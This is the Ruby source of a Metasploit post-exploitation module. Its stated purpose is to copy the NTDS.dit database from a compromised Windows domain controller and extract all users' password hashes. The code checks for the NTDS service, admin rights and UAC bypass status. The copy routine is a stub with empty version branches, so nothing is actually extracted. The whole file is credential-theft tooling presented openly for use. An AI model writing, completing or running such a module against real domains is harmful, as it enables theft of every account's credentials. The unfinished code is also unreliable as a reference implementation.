##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Domain Controller Hashdump',
      'Description'   => %q{
        This module attempts to copy the NTDS.dit database from a live Domain Controller
        and then parse out all of the User Accounts. It saves all of the captured password
        hashes, including historical ones.
  },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
  ))
  end

  def run
    if preconditions_met?
      copy_database_file
    end
  end

  def copy_database_file
    database_file_path = nil
    case  sysinfo["OS"]
      when /2003/

      when /2008|2012/
      else
        print_error "This version of Windows in unsupported"
    end
  end

  def is_domain_controller?
    status = false
    service_list.each do |svc|
      if svc[:name] == 'NTDS'
        status = true
        break
      end
    end
    status
  end

  def preconditions_met?
    status = true
    unless is_domain_controller?
      print_error "This does not appear to be an AD Domain Controller"
      status = false
    end
    unless is_admin?
      print_error "This module requires Admin privs to run"
      status = false
    end
    if is_uac_enabled?
      print_error "This module requires UAC to be bypassed first"
      status = false
    end
    return status
  end


end
